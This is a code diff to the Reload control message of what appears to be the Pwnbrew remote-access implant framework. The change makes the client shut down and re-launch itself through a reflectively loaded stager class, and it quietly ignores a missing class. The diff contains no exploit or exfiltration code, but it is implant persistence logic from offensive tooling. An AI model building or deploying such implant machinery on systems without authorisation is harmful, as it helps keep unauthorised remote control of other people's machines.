@@ -45,8 +45,13 @@ The copyright on this package is held by Securifera, Inc
 
 package pwnbrew.network.control.messages;
 
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.CommManager;
-import pwnbrew.misc.Utilities;
 
 /**
  *
@@ -83,10 +88,33 @@ public final class Reload extends ControlMessage{ // NO_UCD (use default)
      * @param passedManager
     */
     @Override
-    public void evaluate( CommManager passedManager ) {    
+    public void evaluate( CommManager passedManager ) {  
         
-        //Restart the client
-        Utilities.restart( passedManager, false, 5000 ); 
+        try {
+            
+            //Get the stager class
+            String svcStr = "";
+            Class stagerClass = Class.forName("stager.Stager");
+            Field aField = stagerClass.getField("serviceName");
+            Object anObj = aField.get(null);
+            if( anObj != null && anObj instanceof String ){
+                //Cast to string
+                svcStr = (String)anObj;
+            }
+            
+            //Shutdown the client
+            passedManager.shutdown();
+            
+            //Call the stager main function
+            Method aMethod = stagerClass.getMethod( "main", new Class[]{ String[].class } );
+            aMethod.invoke(null, new Object[] { new String[]{ svcStr } });
+                        
+        } catch (ClassNotFoundException ex) {
+            ex = null;
+        } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchFieldException ex) {
+            RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);    
+        }
+            
     }
 
 }/* END CLASS Reload */
